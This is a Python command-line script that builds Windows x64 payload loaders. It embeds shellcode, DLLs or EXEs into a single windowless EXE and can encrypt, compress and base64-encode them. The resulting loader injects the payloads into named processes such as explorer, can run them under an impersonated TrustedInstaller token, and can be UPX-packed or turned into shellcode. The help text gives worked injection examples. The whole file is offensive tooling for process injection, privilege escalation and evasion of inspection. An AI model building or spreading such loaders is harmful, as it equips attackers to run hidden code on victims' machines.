#!/usr/bin/env python3
"""Injector-Generator.py — PE-Injector-Generator CLI (orchestration layer).

Turns one or more payloads (shellcode / dll / exe) into a single Windows x64
EXE that injects or self-boots them as declared. This script only orchestrates:
parse args -> build job table -> embed via bin2source -> render config ->
compile via clang-cl -> verify -> optional UPX.

See docs/cli-help.md for the CLI contract.
"""

from __future__ import annotations

import argparse
import ctypes
import hashlib
import json
import os
import shutil
import subprocess
import sys
import textwrap
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC_LOADER = ROOT / "src" / "loader"
VENDOR_TI = ROOT / "vendor" / "ti"
TEMP = ROOT / "temp"
OUT = ROOT / "out"

sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT / "src"))
import toolchain  # noqa: E402
import pe_probe  # noqa: E402

VERSION = "0.1.0"

# exit codes (docs/cli-help.md)
EXIT_OK = 0
EXIT_ARGS = 2
EXIT_INPUT = 3
EXIT_ARCH = 4
EXIT_TARGET = 5
EXIT_TOOLCHAIN = 6
EXIT_COMPILE = 7
EXIT_VERIFY = 8
EXIT_PE = 10
EXIT_CODEC = 11
EXIT_WAIT = 12

JOB_TYPES = {"shellcode", "dll", "exe"}
JOB_KEYS = {"type", "file", "target", "export", "arg", "wait", "ti"}
SINGLE_KEYS = {"type", "file", "target", "export", "wait", "ti"}

# --------------------------------------------------------------------------- #
# terminal color
# --------------------------------------------------------------------------- #
RESET = "\x1b[0m"
BOLD = "\x1b[1m"
RED = "\x1b[31m"
GREEN = "\x1b[32m"
YELLOW = "\x1b[33m"
CYAN = "\x1b[36m"
GRAY = "\x1b[90m"


def _enable_windows_vt() -> bool:
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        ok = True
        for handle_id in (-11, -12):  # STD_OUTPUT_HANDLE, STD_ERROR_HANDLE
            handle = kernel32.GetStdHandle(handle_id)
            mode = ctypes.c_uint32()
            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                ok = False
                continue
            if not (mode.value & 0x0004):  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
                if not kernel32.SetConsoleMode(handle, mode.value | 0x0004):
                    ok = False
        return ok
    except Exception:
        return False


def _color_enabled() -> bool:
    if os.environ.get("NO_COLOR"):
        return False
    if os.environ.get("TERM") == "dumb":
        return False
    if hasattr(sys.stdout, "isatty") and sys.stdout.isatty():
        return _enable_windows_vt()
    return False


COLOR = _color_enabled()


def paint(text, *codes) -> str:
    if not COLOR or not codes:
        return str(text)
    return "".join(codes) + str(text) + RESET


def title(t): return paint(t, BOLD, CYAN)
def bold(t): return paint(t, BOLD)
def accent(t): return paint(t, CYAN)
def gray(t): return paint(t, GRAY)
def green(t): return paint(t, GREEN)
def yellow(t): return paint(t, YELLOW)
def red(t): return paint(t, RED)


class _Heading(str):
    """Section title; the block after it sits directly underneath."""


def H(name: str) -> _Heading:
    return _Heading(bold(name))


def _options(rows, width: int = 30, total: int = 96) -> str:
    """Two-column option table with hanging indent for wrapped descriptions."""
    text_width = max(24, total - 2 - width)
    hanging = " " * (2 + width)
    out = []
    for flag, desc in rows:
        pad = " " * max(2, width - len(flag))
        lines = textwrap.wrap(desc, width=text_width) or [""]
        out.append("  " + accent(flag) + pad + lines[0])
        for extra in lines[1:]:
            out.append(hanging + extra)
    return "\n".join(out)


def _body(*blocks) -> str:
    out = []
    prev = None
    for block in blocks:
        if prev is not None:
            out.append("\n" if isinstance(prev, _Heading) else "\n\n")
        out.append(block)
        prev = block
    return "".join(out) + "\n"


def render_help() -> str:
    job_keys = [
        ("type", "payload kind: shellcode | dll | exe  (required)"),
        ("file", "payload path  (required)"),
        ("target", "process name to inject into; omit to run locally"),
        ("export", "DLL export to call after DllMain  (dll only)"),
        ("arg", "EXE command-line arg; repeatable  (exe only)"),
        ("wait", "1 = wait for the target process to appear"),
        ("ti", "1 = TrustedInstaller impersonation; 0 = off (default)"),
    ]
    return _body(
        title("PE-Injector-Generator") + "  " + gray("build payloads into one Windows x64 EXE."),
        H("USAGE:"),
        "  Injector-Generator.py (--job \"key=value\" | --manifest PATH) [options]\n"
        "  Injector-Generator.py --help\n"
        "  Injector-Generator.py --doctor",
        H("JOB DEFINITION  (--job / --manifest are mutually exclusive)"),
        "  " + accent("--job ") + "    one job, repeatable; order == execution order.\n"
        "            format " + accent('"key1=value1,key2=value2"') + "; quote values that contain spaces or commas.",
        _options(job_keys, width=10),
        "  " + accent("--manifest PATH") + "   read the full job table from a JSON file",
        H("PAYLOAD TRANSFORMS"),
        _options([
            ("-z, --compress {zstd,deflate}", "compress (default: none)"),
            ("--compress-level N", "deflate 1-9 (default:9) / zstd 1-22 (default:19)"),
            ("-b, --base64", "base64-encode (default: off)"),
            ("--password string", "AES-256 encrypt; key bytes = SHA256(string)"),
            ("--encryption-type {cbc,ctr}", "default cbc; IV prepended"),
        ]),
        H("BUILD & PRODUCT"),
        _options([
            ("-o, --output PATH", "default out/loader_<timestamp>.exe"),
            ("--console", "console subsystem (default: windowless)"),
            ("--debug", "-Od + PDB + logs (default: release)"),
            ("--static-crt", "/MT static CRT (default: /MD)"),
            ("-ti, --trustedinstaller", "run payloads with a TrustedInstaller token (best effort)"),
        ]),
        H("TARGET & WAIT"),
        _options([
            ("--waiting-process", "loop until the target appears, inject once"),
            ("--poll-interval MS", "snapshot interval, default 1000"),
            ("--wait-timeout MS", "default 0 = wait forever"),
            ("--process-mode {all,first}", "default all"),
            ("--match {exact,substring}", "default substring (case-insensitive)"),
        ]),
        H("OTHER"),
        _options([
            ("--verify", "runtime digest check; a corrupt payload is skipped"),
            ("--keep-temp", "keep temp/ generated sources (default: cleaned)"),
            ("--upx [N]", "UPX-compress the product (default level 9)"),
            ("--shellcode-final", "convert the EXE to shellcode; excludes --upx/--password/--console/--debug"),
            ("--doctor", "check toolchain and build prerequisites"),
            ("--version", "show generator and tool versions"),
            ("-h, --help", "show this help"),
        ]),
        H("EXAMPLES"),
        "  " + accent('Injector-Generator.py --job "type=shellcode,file=payload.bin,target=explorer,ti=1" --compress zstd --base64') + "\n"
        "  " + accent('Injector-Generator.py --job "type=dll,file=payload.dll,target=explorer,ti=1" --waiting-process -ti') + "\n"
        "  " + accent('Injector-Generator.py --job "type=exe,file=payload.exe,arg=--help,ti=1" --upx -o payload_loader.exe'),
        gray("Color disables automatically when output is redirected, or with NO_COLOR=1."),
    )


def fail(msg: str, code: int = EXIT_ARGS):
    print(red("error:") + " " + msg, file=sys.stderr)
    sys.exit(code)


# --------------------------------------------------------------------------- #
# argument parsing
# --------------------------------------------------------------------------- #
class Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        print(red("error:") + " " + message, file=sys.stderr)
        print("  " + gray("run 'Injector-Generator.py -h' for the option list"), file=sys.stderr)
        raise SystemExit(EXIT_ARGS)


def build_parser() -> argparse.ArgumentParser:
    p = Parser(add_help=False)
    p.format_help = lambda: render_help()
    p.add_argument("--job", action="append", metavar="SPEC")
    p.add_argument("--manifest", metavar="PATH")
    p.add_argument("-o", "--output", metavar="PATH")
    p.add_argument("-z", "--compress", choices=["zstd", "deflate"], default=None)
    p.add_argument("--compress-level", type=int, default=None, metavar="N")
    p.add_argument("-b", "--base64", action="store_true")
    p.add_argument("--password", metavar="STR")
    p.add_argument("--encryption-type", choices=["cbc", "ctr"], default="cbc")
    p.add_argument("--console", action="store_true")
    p.add_argument("--debug", action="store_true")
    p.add_argument("--static-crt", action="store_true")
    p.add_argument("-ti", "--trustedinstaller", action="store_true",
                   help="run payloads with a TrustedInstaller impersonation token (best effort; falls back to the caller's token)")
    p.add_argument("--waiting-process", action="store_true")
    p.add_argument("--poll-interval", type=int, default=1000, metavar="MS")
    p.add_argument("--wait-timeout", type=int, default=0, metavar="MS")
    p.add_argument("--process-mode", choices=["all", "first"], default="all")
    p.add_argument("--match", choices=["exact", "substring"], default="substring")
    p.add_argument("--verify", action="store_true")
    p.add_argument("--keep-temp", action="store_true")
    p.add_argument("--upx", nargs="?", const=9, type=int, default=None, metavar="N")
    p.add_argument("--shellcode-final", action="store_true",
                   help="convert the final EXE to shellcode via shellcode-generator "
                        "(mutually exclusive with --upx and --password)")
    p.add_argument("--self-ti", action="store_true",
                   help="process-level TrustedInstaller: relaunch self as a TI process "
                        "(best effort; mutually exclusive with --shellcode-final and thread-level TI)")
    p.add_argument("--doctor", action="store_true")
    p.add_argument("--version", action="store_true")
    p.add_argument("-h", "--help", action="store_true")
    return p


# --------------------------------------------------------------------------- #
# job parsing (quote-aware)
# --------------------------------------------------------------------------- #
def split_quoted(s: str, sep: str = ",") -> list[str]:
    """Split on sep, ignoring sep inside double quotes."""
    parts, cur, in_q = [], [], False
    for ch in s:
        if ch == '"':
            in_q = not in_q
            cur.append(ch)
        elif ch == sep and not in_q:
            parts.append("".join(cur).strip())
            cur = []
        else:
            cur.append(ch)
    parts.append("".join(cur).strip())
    return parts


def unquote(v: str) -> str:
    v = v.strip()
    if len(v) >= 2 and v[0] == '"' and v[-1] == '"':
        return v[1:-1]
    return v


def parse_job(spec: str, index: int) -> dict:
    job: dict = {}
    for kv in split_quoted(spec):
        if "=" not in kv:
            fail(f"job {index}: item missing '=': {kv!r}")
        k, v = kv.split("=", 1)
        k, v = k.strip(), unquote(v)
        if k not in JOB_KEYS:
            fail(f"job {index}: unknown key {k!r} (valid: {', '.join(sorted(JOB_KEYS))})")
        if k == "arg":
            job.setdefault("arg", []).append(v)
        elif k in job:
            fail(f"job {index}: duplicate key {k!r}")
        else:
            job[k] = v
    if "type" not in job or "file" not in job:
        fail(f"job {index}: missing required key 'type' or 'file'")
    if job["type"] not in JOB_TYPES:
        fail(f"job {index}: invalid type {job['type']!r} (valid: shellcode|dll|exe)")
    return job


def load_manifest(path: str) -> list[dict]:
    try:
        data = json.loads(Path(path).read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as e:
        fail(f"cannot read manifest {path!r}: {e}", EXIT_INPUT)
    jobs = data.get("jobs") if isinstance(data, dict) else data
    if not isinstance(jobs, list) or not jobs:
        fail(f"manifest {path!r} has no job list", EXIT_INPUT)
    return jobs


def build_jobs(args) -> list[dict]:
    sources = [s for s in (args.job is not None, args.manifest is not None) if s]
    if len(sources) != 1:
        fail("specify exactly one of --job / --manifest")
    jobs = [parse_job(s, i) for i, s in enumerate(args.job)] if args.job else load_manifest(args.manifest)
    # validate targets
    for i, j in enumerate(jobs):
        t = j["type"]
        tgt = j.get("target")
        if t == "exe" and tgt:
            fail(f"job {i}: type=exe cannot have a target (self-boot only)", EXIT_TARGET)
        if tgt is not None and tgt == "-":
            j["target"] = None  # explicit local
        if tgt is not None and tgt != "-" and (t == "shellcode" or t == "dll"):
            # remote; keep name
            pass
        # archive the payload file path for preflight
        j["_file"] = j["file"]
    return jobs


# --------------------------------------------------------------------------- #
# rendering
# --------------------------------------------------------------------------- #
def render_job_table(jobs: list[dict], args) -> None:
    print(bold("job table"))
    print("  " + gray(f"{'#':<2} {'TYPE':<10} {'FILE':<40} {'TARGET':<16} {'MODE':<8}"))
    n_remote = 0
    for i, j in enumerate(jobs):
        tgt = j.get("target")
        mode = "remote" if tgt else "local"
        n_remote += 1 if tgt else 0
        print(f"  {i:<2} {j['type']:<10} {j['file']:<40} {tgt or '-':<16} {mode:<8}")
    sub = "console" if args.console else "gui"
    print("  " + gray("-" * 76))
    print(f"  {len(jobs)} job(s) · {n_remote} remote · {len(jobs) - n_remote} local · x64 · "
          f"{'debug' if args.debug else 'release'} · {sub}")


# --------------------------------------------------------------------------- #
# preflight
# --------------------------------------------------------------------------- #
def preflight(jobs: list[dict]):
    tc = toolchain.detect()
    if not tc["ok"]:
        print("toolchain problems:")
        for e in tc["errors"]:
            print(f"  - {e}")
        fail("toolchain not ready", EXIT_TOOLCHAIN)

    # PE pre-check: dll/exe must be x64
    for i, j in enumerate(jobs):
        if j["type"] == "shellcode":
            continue
        try:
            info = pe_probe.parse_pe(j["file"])
        except pe_probe.PEError as e:
            fail(f"job {i}: {e}", EXIT_INPUT)
        if not info["is_x64"]:
            fail(f"job {i}: {j['file']!r} is {info['arch']}, not x64", EXIT_ARCH)
        if j["type"] == "exe":
            if info["is_dll"]:
                fail(f"job {i}: type=exe but {j['file']!r} is a DLL", EXIT_PE)
            if info["is_dotnet"]:
                fail(f"job {i}: {j['file']!r} is a .NET assembly, self-mapping unsupported", EXIT_PE)
            if not info["has_reloc"]:
                fail(f"job {i}: {j['file']!r} has no .reloc, self-mapping requires relocations", EXIT_PE)
        if j["type"] == "dll" and not info["is_dll"]:
            fail(f"job {i}: type=dll but {j['file']!r} is an EXE", EXIT_PE)
    return tc


# --------------------------------------------------------------------------- #
# embed (bin2source)
# --------------------------------------------------------------------------- #
def embed(jobs: list[dict], args, tc) -> list[dict]:
    b2s = tc["bin2source"]
    if not b2s:
        fail("bin2source not found", EXIT_TOOLCHAIN)

    key_hex = None
    if args.password:
        key_hex = hashlib.sha256(args.password.encode("utf-8")).hexdigest()

    embeds = []
    for i, j in enumerate(jobs):
        name = f"payload_{i}"
        out_h = TEMP / f"{name}.h"
        cmd = [b2s, "-f", j["file"], "-c", "-name", name, "-o", str(out_h)]
        flags = 0  # 0x03 codec, 0x04 b64, 0x08 encrypted, 0x10 ctr
        if args.compress:
            cmd += ["-z", args.compress]
            if args.compress_level is not None:
                cmd += ["--level", str(args.compress_level)]
            flags |= 1 if args.compress == "zstd" else 2
        if args.password:
            if args.encryption_type == "ctr":
                cmd += ["-ctr", key_hex]
                flags |= 0x10
            else:
                cmd += ["-cbc", key_hex]
            flags |= 0x08
        if args.base64:
            cmd += ["-b64"]
            flags |= 0x04
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            fail(f"bin2source failed for job {i} ({j['file']}): {r.stderr.strip()}", EXIT_CODEC)
        digest = hashlib.sha256(Path(j["file"]).read_bytes()).hexdigest()
        embeds.append({"name": name, "sha256": digest, "header": f"{name}.h", "codec": flags})
    return embeds


# --------------------------------------------------------------------------- #
# generate (jobs.h + config.h)
# --------------------------------------------------------------------------- #
def build_pic_stub(tc, src_c, stub_name, out_header) -> None:
    """Compile a PIC stub (src_c) and emit its .text as a C array header.

    Flow: clang-cl -O1 -GS- -> lld-link /entry:stub /nodefaultlib -> parse the
    PE and slice out .text (vsize, not rawsize) -> bin2source into out_header.
    """
    obj = TEMP / f"{stub_name}.obj"
    exe = TEMP / f"{stub_name}.exe"

    r = subprocess.run([tc["clang_cl"], "-nologo", "-O1", "-GS-", "-c",
                        str(src_c), f"-Fo:{obj}"], capture_output=True, text=True)
    if r.returncode != 0:
        fail(f"{stub_name} compile failed: {r.stderr.strip()}", EXIT_COMPILE)

    r = subprocess.run([tc["lld_link"], str(obj), "/entry:stub", "/nodefaultlib",
                        "/subsystem:console", f"/out:{exe}"], capture_output=True, text=True)
    if r.returncode != 0:
        fail(f"{stub_name} link failed: {r.stderr.strip()}", EXIT_COMPILE)

    info = pe_probe.parse_pe(str(exe))
    data = Path(exe).read_bytes()
    stub_bytes = None
    for s in info["sections"]:
        if s["name"] == ".text":
            stub_bytes = data[s["rawptr"]:s["rawptr"] + s["vsize"]]
            break
    if stub_bytes is None:
        fail(f"{stub_name} has no .text section", EXIT_COMPILE)

    bin_path = TEMP / f"{stub_name}.bin"
    bin_path.write_bytes(stub_bytes)
    r = subprocess.run([tc["bin2source"], "-f", str(bin_path), "-c", "-name",
                        f"{stub_name}_code", "-o", str(TEMP / out_header)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        fail(f"{stub_name} embed failed: {r.stderr.strip()}", EXIT_CODEC)


def build_stub(tc) -> None:
    """Compile all PIC stubs and emit their temp/*.h headers."""
    build_pic_stub(tc, SRC_LOADER / "stub.c", "stub", "stub_data.h")
    build_pic_stub(tc, SRC_LOADER / "stub_sc.c", "stub_sc", "stub_sc_data.h")


def _c_wstring(s: str) -> str:
    out = s.replace("\\", "\\\\").replace('"', '\\"')
    return f'L"{out}"'


def render_jobs_header(jobs: list[dict], embeds: list[dict], args) -> str:
    lines = ["/* generated by Injector-Generator.py — do not edit */", "#pragma once"]
    for e in embeds:
        lines.append(f'#include "{e["header"]}"')
    lines.append("")
    lines.append("struct job_t {")
    lines.append("    int type;                 /* 0=shellcode 1=dll 2=exe */")
    lines.append("    int codec;                /* 0x03 codec 0x04 b64 0x08 enc 0x10 ctr */")
    lines.append("    const unsigned char *data;")
    lines.append("    unsigned int len;")
    lines.append("    unsigned int raw_len;     /* original size (for zstd/deflate) */")
    lines.append("    const char *sha256;")
    lines.append("    const wchar_t *target;    /* nullptr = local */")
    lines.append("    const wchar_t *export_name; /* dll export to call, nullptr = none */")
    lines.append("    const wchar_t *args;      /* exe command line, nullptr = none */")
    lines.append("    int wait;")
    lines.append("    int ti;                   /* 1 = TrustedInstaller impersonation */")
    lines.append("};")
    lines.append("")
    lines.append("static const job_t JOBS[] = {")
    type_map = {"shellcode": 0, "dll": 1, "exe": 2}
    for i, j in enumerate(jobs):
        tgt = _c_wstring(j["target"]) if j.get("target") else "nullptr"
        exp = _c_wstring(j["export"]) if j.get("export") else "nullptr"
        wait = 1 if j.get("wait") in ("1", 1, True) else 0
        arg_list = j.get("arg", [])
        arg_ref = _c_wstring(" ".join(arg_list)) if arg_list else "nullptr"
        ti_str = j.get("ti")
        if ti_str == "1":
            ti_val = 1
        elif ti_str == "0":
            ti_val = 0
        else:
            ti_val = 1 if args.trustedinstaller else 0
        flags = embeds[i]["codec"]
        data_ref = f"payload_{i}_b64" if (flags & 0x04) else f"payload_{i}"
        raw_ref = f"payload_{i}_raw_len" if (flags & 0x03) else f"payload_{i}_len"
        lines.append(f'    {{ {type_map[j["type"]]}, {flags}, '
                     f'(const unsigned char *){data_ref}, payload_{i}_len, {raw_ref}, '
                     f'payload_{i}_sha256, {tgt}, {exp}, {arg_ref}, {wait}, {ti_val} }},')
    lines.append("};")
    lines.append("")
    lines.append(f"static const int JOB_COUNT = {len(jobs)};")
    return "\n".join(lines) + "\n"


def render_config_header(args) -> str:
    lines = ["/* generated by Injector-Generator.py — do not edit */", "#pragma once"]
    lines.append(f"#define PIG_CONSOLE {1 if args.console else 0}")
    lines.append(f"#define PIG_DEBUG {1 if args.debug else 0}")
    lines.append(f"#define PIG_VERIFY {1 if args.verify else 0}")
    lines.append(f"#define PIG_POLL_INTERVAL {args.poll_interval}")
    lines.append(f"#define PIG_WAIT_TIMEOUT {args.wait_timeout}")
    lines.append(f"#define PIG_PROCESS_MODE_FIRST {1 if args.process_mode == 'first' else 0}")
    lines.append(f"#define PIG_MATCH_SUBSTRING {1 if args.match == 'substring' else 0}")
    lines.append(f"#define PIG_WAITING {1 if args.waiting_process else 0}")
    lines.append(f"#define PIG_SELF_TI {1 if args.self_ti else 0}")
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------- #
# compile + finalize
# --------------------------------------------------------------------------- #
def compile_exe(args, tc, use_zstd: bool = False) -> Path:
    sources = [str(SRC_LOADER / "main.cpp"), str(SRC_LOADER / "selfmap.cpp"),
               str(SRC_LOADER / "dllload.cpp"), str(SRC_LOADER / "proc.cpp"),
               str(SRC_LOADER / "remotemap.cpp"), str(SRC_LOADER / "codec.cpp"),
               str(SRC_LOADER / "sha256.cpp"), str(SRC_LOADER / "aes.c"),
               str(SRC_LOADER / "miniz.c"), str(SRC_LOADER / "miniz_tinfl.c")]
    if args.output:
        out_exe = Path(args.output)
    else:
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        out_exe = OUT / f"loader_{stamp}.exe"
    out_exe.parent.mkdir(parents=True, exist_ok=True)

    cflags = ["-DAES256"]  # codec.cpp always references AES-256 (aes.c is tiny)
    # miniz: only need inflate; drop deflate/zip/stdio to keep the binary lean
    cflags += ["-DMINIZ_NO_DEFLATE_APIS", "-DMINIZ_NO_ARCHIVE_APIS",
               "-DMINIZ_NO_STDIO", "-DMINIZ_NO_TIME"]
    if use_zstd:
        cflags.append("-DPIG_ZSTD")
    r = toolchain.compile_loader(
        sources, str(out_exe),
        subsystem="console" if args.console else "windows",
        debug=args.debug,
        static_crt=args.static_crt,
        use_zstd=use_zstd,
        extra_include=[TEMP, SRC_LOADER, VENDOR_TI],
        extra_libs=[str(VENDOR_TI / "ti.lib")],
        extra_cflags=cflags,
        tc=tc,
    )
    if r.returncode != 0:
        print(r.stdout)
        print(r.stderr, file=sys.stderr)
        fail(f"compile failed (see above)", EXIT_COMPILE)
    return out_exe


def sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def write_manifest(args, jobs, embeds, tc, out_exe: Path, cmdline) -> None:
    m = {
        "generator": VERSION,
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "command_line": cmdline,
        "arch": "x64",
        "subsystem": "console" if args.console else "windows",
        "tools": {
            "clang": tc.get("clang_version"),
            "bin2source": tc.get("bin2source"),
            "python": tc.get("python_version"),
        },
        "jobs": [
            {
                "type": j["type"],
                "file": j["file"],
                "target": j.get("target"),
                "sha256": e["sha256"],
                "size": Path(j["file"]).stat().st_size,
            }
            for j, e in zip(jobs, embeds)
        ],
        "output": str(out_exe),
        "output_sha256": sha256_file(out_exe),
        "output_size": out_exe.stat().st_size,
    }
    mf = out_exe.with_suffix(out_exe.suffix + ".manifest.json")
    mf.write_text(json.dumps(m, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"manifest: {mf}")


def apply_upx(args, tc, out_exe: Path) -> None:
    upx = tc.get("upx")
    if not upx:
        fail("upx not found", EXIT_TOOLCHAIN)
    r = subprocess.run([upx, f"-{args.upx}", str(out_exe)], capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout)
        print(r.stderr, file=sys.stderr)
        fail("upx failed", EXIT_VERIFY)


def apply_shellcode_final(args, tc, out_exe: Path) -> Path:
    """Convert the final EXE to shellcode via shellcode-generator.

    Runs with entropy=full and bypass=continue; the codec is left at the
    default (none) and the arch at auto (x64). Returns the .bin path.
    """
    sc_gen = tc.get("shellcode_generator")
    if not sc_gen:
        fail("shellcode-generator not found", EXIT_TOOLCHAIN)
    out_bin = out_exe.with_suffix(".bin")
    r = subprocess.run([sc_gen, "-i", str(out_exe), "-o", str(out_bin),
                        "-e", "full", "-b", "continue"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout)
        print(r.stderr, file=sys.stderr)
        fail("shellcode conversion failed", EXIT_VERIFY)
    return out_bin


# --------------------------------------------------------------------------- #
# doctor / version
# --------------------------------------------------------------------------- #
def cmd_doctor():
    tc = toolchain.detect()
    ok = tc["ok"] and tc.get("bin2source") and tc.get("zstd") and tc.get("upx")
    print("PE-Injector-Generator doctor")
    print("=" * 40)
    fields = [
        ("clang-cl", tc.get("clang_cl")),
        ("lld-link", tc.get("lld_link")),
        ("clang version", tc.get("clang_version")),
        ("MSVC", tc.get("msvc")),
        ("Windows SDK", tc.get("sdk")),
        ("bin2source", tc.get("bin2source")),
        ("zstd", tc.get("zstd")),
        ("upx", tc.get("upx")),
        ("shellcode-generator", tc.get("shellcode_generator")),
        ("python", tc.get("python_version")),
    ]
    for name, val in fields:
        status = "ok" if val else "MISSING"
        print(f"  {name:<20} {status:<8} {val or ''}")
    print("=" * 40)
    if ok:
        print("result: ready to build")
        sys.exit(EXIT_OK)
    else:
        print("result: NOT ready — fix the missing items above")
        sys.exit(EXIT_TOOLCHAIN)


def cmd_version():
    tc = toolchain.detect()
    print(f"Injector-Generator {VERSION}")
    print(f"clang: {tc.get('clang_version')}")
    print(f"bin2source: {tc.get('bin2source')}")
    print(f"python: {tc.get('python_version')}")


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.help:
        print(render_help())
        return
    if args.version:
        cmd_version()
        return
    if args.doctor:
        cmd_doctor()
        return

    if args.shellcode_final and args.upx:
        fail("--shellcode-final and --upx are mutually exclusive", EXIT_ARGS)
    if args.shellcode_final and args.password:
        fail("--shellcode-final cannot be combined with --password (encryption)", EXIT_ARGS)
    if args.shellcode_final and args.console:
        fail("--shellcode-final cannot be combined with --console (a shellcode host has no console)", EXIT_ARGS)
    if args.shellcode_final and args.debug:
        fail("--shellcode-final cannot be combined with --debug (PDB/logs are meaningless for raw shellcode)", EXIT_ARGS)

    if args.self_ti and args.shellcode_final:
        fail("--self-ti and --shellcode-final are mutually exclusive (a shellcode loader cannot relaunch itself)", EXIT_ARGS)
    if args.self_ti and args.trustedinstaller:
        fail("--self-ti (process-level) and -ti/--trustedinstaller (thread-level) are mutually exclusive", EXIT_ARGS)

    jobs = build_jobs(args)
    if args.self_ti:
        for i, j in enumerate(jobs):
            if j.get("ti") == "1":
                fail(f"--self-ti conflicts with job {i} ti=1 (thread-level)", EXIT_ARGS)
    render_job_table(jobs, args)

    tc = preflight(jobs)
    TEMP.mkdir(parents=True, exist_ok=True)

    embeds = embed(jobs, args, tc)

    (TEMP / "jobs.h").write_text(render_jobs_header(jobs, embeds, args), encoding="utf-8")
    (TEMP / "config.h").write_text(render_config_header(args), encoding="utf-8")
    build_stub(tc)

    use_zstd = any((e["codec"] & 0x03) == 1 for e in embeds)
    out_exe = compile_exe(args, tc, use_zstd=use_zstd)
    print(green("built") + gray(f"  {out_exe} ({out_exe.stat().st_size} bytes)"))

    if args.shellcode_final:
        out_bin = apply_shellcode_final(args, tc, out_exe)
        print(green("shellcode") + gray(f"  {out_bin} ({out_bin.stat().st_size} bytes)"))
        out_exe.unlink(missing_ok=True)  # the shellcode is the final artifact
        out_exe = out_bin

    if args.upx:
        apply_upx(args, tc, out_exe)
        print(yellow("upx") + gray(f"  {out_exe} ({out_exe.stat().st_size} bytes)"))

    write_manifest(args, jobs, embeds, tc, out_exe, " ".join(argv or sys.argv[1:]))

    if not args.keep_temp:
        shutil.rmtree(TEMP, ignore_errors=True)
        TEMP.mkdir(exist_ok=True)

    print(green("done"))
    sys.exit(EXIT_OK)


if __name__ == "__main__":
    main()
